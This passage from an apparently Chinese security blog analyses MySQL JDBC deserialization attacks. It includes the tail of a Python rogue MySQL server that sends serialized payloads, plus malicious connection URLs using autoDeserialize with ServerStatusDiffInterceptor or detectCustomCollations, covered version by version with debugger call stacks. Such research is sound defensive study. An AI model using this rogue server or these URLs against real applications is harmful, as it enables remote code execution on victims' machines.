class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3309</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure><p>假设我们客户端上有CC3.1的依赖，我们打CC7</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426901.png" alt="image-20241225111302009"></p><p>我们打断点调试一下</p><p>调用堆栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getObject:<span class="number">1237</span>, ResultSetImpl (com.mysql.cj.jdbc.result)</span><br><span class="line">resultSetToMap:<span class="number">46</span>, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">populateMapWithSessionStatusValues:<span class="number">87</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">105</span>, ServerStatusDiffInterceptor (com.mysql.cj.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">76</span>, NoSubInterceptorWrapper (com.mysql.cj)</span><br><span class="line">invokeQueryInterceptorsPre:<span class="number">1144</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryPacket:<span class="number">970</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryString:<span class="number">921</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">execSQL:<span class="number">1165</span>, NativeSession (com.mysql.cj)</span><br><span class="line">setAutoCommit:<span class="number">2064</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">handleAutoCommitDefaults:<span class="number">1382</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">1327</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">966</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:<span class="number">825</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">455</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:<span class="number">240</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:<span class="number">199</span>, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">270</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">32</span>, jdbcMain (org.example.jdbcdemo)</span><br></pre></td></tr></table></figure><p>在主函数中加载驱动后，调用驱动的getConnection函数</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426512.png" alt="image-20241225113621635"></p><p>创建ConnectionImpl实例，在其构造方法中创建了新的IO</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271428633.png" alt="image-20241225114129125"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426755.png" alt="image-20241225114209016"></p><p>在创建IO后发起ConnectOneTryOnly连接</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426766.png" alt="image-20241225114603132"></p><p>然后<code>this.session.connect</code>尝试建立连接，参数都放好了</p><p><code>oldAutoCommit</code>, <code>oldIsolationLevel</code>, <code>oldReadOnly</code>, <code>oldCatalog</code>：保存当前连接的一些属性（如自动提交模式、事务隔离级别、只读模式和目录）以便之后可能恢复这些设置</p><p><code>this.session.setQueryInterceptors(this.queryInterceptors)</code>：设置查询拦截器，用来执行查询时进行某些处理或修改</p><p><code>this.initializePropsFromServer</code>：从服务器初始化连接的相关属性，配置会话参数</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271426112.png" alt="image-20241225114747496"></p><p>跟进到initializePropsFromServer函数</p><p>判断是否加载connectionInterceptorClasses，同时设置服务参数</p><p>进入处理数据库连接的自动提交（<code>autoCommit</code>）默认设置的handleAutoCommitDefaults函数</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427029.png" alt="image-20241225144521063"></p><p>跟进setter</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427842.png" alt="image-20241225144859388"></p><p>在setAutoCommit中封装了execSQL，执行了SET autocommit&#x3D;1</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427469.png" alt="image-20241225145745948"></p><p>在execSQL中封装了sendQueryString，再封装成sendQueryPacket，经由套接字对象发送</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427727.png" alt="image-20241225145849582"></p><p>值得注意的是再sendPacket中会判断是否有拦截器</p><p>还记得我们客户端的代码中指定了拦截器吗：<code>queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p><p>然后invokePre，调用PreProcess，最后调用到populateMapWithSessionStatusValues，然后就是ResultSetImpl的getObject</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427194.png" alt="image-20241225150306224"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427719.png" alt="image-20241225150447521"></p><h4 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h4><p>测试版本为5.1.5</p><p>payload如下，在8以下的版本中需要将queryInterceptors修改为statementInterceptors</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure><p>拦截器invoke的pre和post两个阶段均会调用到这个gadget</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271427432.png" alt="image-20241225161553802"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412271428409.png" alt="image-20241225162046364"></p><h4 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11 - 5.x.xx"></a>5.1.11 - 5.x.xx</h4><p>测试版本为5.1.20</p><p>payload如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><p>调试过程大差不差</p><p>invokeStatementInterceptorsPre</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">populateMapWithSessionStatusValues:<span class="number">77</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">93</span>, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:<span class="number">54</span>, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:<span class="number">67</span>, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:<span class="number">2880</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:<span class="number">2544</span>, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2677</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:<span class="number">2627</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:<span class="number">1556</span>, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:<span class="number">3898</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">3443</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">2443</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:<span class="number">2213</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">797</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">47</span>, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-<span class="number">1</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">62</span>, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">45</span>, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:<span class="number">408</span>, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:<span class="number">411</span>, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:<span class="number">389</span>, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:<span class="number">305</span>, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">35</span>, jdbcMain (org.example.jdbcdemo)</span><br></pre></td></tr></table></figure><p>invokeStatementInterceptorsPost：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">populateMapWithSessionStatusValues:77, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">postProcess:54, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">postProcess:36, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">postProcess:58, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPost:2908, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:2820, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:2677, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:2627, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:1556, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:3898, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:3443, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:2443, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:2213, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:797, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:47, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:411, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:389, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:305, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">main:35, jdbcMain (org.example.jdbcdemo)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">populateMapWithSessionStatusValues:77, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:93, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)</span><br><span class="line">preProcess:54, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)</span><br><span class="line">preProcess:67, NoSubInterceptorWrapper (com.mysql.jdbc)</span><br><span class="line">invokeStatementInterceptorsPre:2880, MysqlIO (com.mysql.jdbc)</span><br><span class="line">sqlQueryDirect:2544, MysqlIO (com.mysql.jdbc)</span><br><span class="line">execSQL:2677, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">execSQL:2627, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">executeQuery:1556, StatementImpl (com.mysql.jdbc)</span><br><span class="line">loadServerVariables:3909, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">initializePropsFromServer:3443, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connectOneTryOnly:2443, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">createNewIO:2213, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:797, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">&lt;init&gt;:47, JDBC4Connection (com.mysql.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:408, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:411, Util (com.mysql.jdbc)</span><br><span class="line">getInstance:389, ConnectionImpl (com.mysql.jdbc)</span><br><span class="line">connect:305, NonRegisteringDriver (com.mysql.jdbc)</span><br><span class="line">getConnection:664, DriverManager (java.sql)</span><br><span class="line">getConnection:247, DriverManager (java.sql)</span><br><span class="line">main:35, jdbcMain (org.example.jdbcdemo)</span><br></pre></td></tr></table></figure><h4 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h4><p>测试版本：6.0.5</p><p>mysql-connector-java 6.x此利用链与上述5.1.11-5.x.xx完全相同，仅因更改jdbc包，由com.mysql.jdbc改为com.mysql.cj.jdbc。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;123&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h4 id="8-0-20以后"><a href="#8-0-20以后" class="headerlink" title="8.0.20以后"></a>8.0.20以后</h4><p>直接不调用getObject了，所以无了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">populateMapWithSessionStatusValues</span><span class="params">(Map&lt;String, String&gt; toPopulate)</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="built_in">this</span>.connection.createStatement();</span><br><span class="line">           <span class="type">Throwable</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">               toPopulate.clear();</span><br><span class="line">               <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">               <span class="type">Throwable</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="keyword">while</span>(rs.next()) &#123;</span><br><span class="line">                       toPopulate.put(rs.getString(<span class="number">1</span>), rs.getString(<span class="number">2</span>));</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125; <span class="keyword">catch</span> (Throwable var30) &#123;</span><br><span class="line">                   var5 = var30;</span><br><span class="line">                   <span class="keyword">throw</span> var30;</span><br><span class="line">               &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">                       <span class="keyword">if</span> (var5 != <span class="literal">null</span>) &#123;</span><br><span class="line">                           <span class="keyword">try</span> &#123;</span><br><span class="line">                               rs.close();</span><br><span class="line">                           &#125; <span class="keyword">catch</span> (Throwable var29) &#123;</span><br><span class="line">                               var5.addSuppressed(var29);</span><br><span class="line">                           &#125;</span><br><span class="line">                       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                           rs.close();</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">catch</span> (Throwable var32) &#123;</span><br><span class="line">               var3 = var32;</span><br><span class="line">               <span class="keyword">throw</span> var32;</span><br><span class="line">           &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">               <span class="keyword">if</span> (stmt != <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">                       <span class="keyword">try</span> &#123;</span><br><span class="line">                           stmt.close();</span><br><span class="line">                       &#125; <span class="keyword">catch</span> (Throwable var28) &#123;</span><br><span class="line">                           var3.addSuppressed(var28);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                       stmt.close();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125; <span class="keyword">catch</span> (SQLException var34) &#123;</span><br><span class="line">           <span class="keyword">throw</span> ExceptionFactory.createException(var34.getMessage(), var34);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h3><h4 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h4><p>测试版本：6.0.5</p><p>启用detectCustomCollations功能</p><blockquote><p><code>detectCustomCollations</code> 是一个用于检测和处理自定义排序规则（collations）的方法或功能，通常出现在数据库系统中，特别是关系型数据库如 MySQL 或 SQL Server</p></blockquote><p>demo如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.MySQLJDBCAttackDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">detectCustomCollations_Demo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;CommonsCollections7&quot;</span>;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用堆栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">resultSetToMap:<span class="number">119</span>, ResultSetUtil (com.mysql.cj.jdbc.util)</span><br><span class="line">buildCollationMapping:<span class="number">746</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">2385</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">1739</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:<span class="number">1596</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">633</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:<span class="number">347</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:<span class="number">219</span>, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">247</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">14</span>, detectCustomCollations_Demo (org.example.MySQLJDBCAttackDemo)</span><br></pre></td></tr></table></figure><p>主要是buildCollationMapping中会发起一次<code>SHOW COLLATION</code>的请求，然后返回结果的时候需要进行ResultSetImpl的getObject</p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412262323148.png" alt="image-20241226231958389"></p><p><img src="https://icfh-imgs-1313391192.cos.ap-nanjing.myqcloud.com/images/202412262323989.png" alt="image-20241226232306626"></p><h4 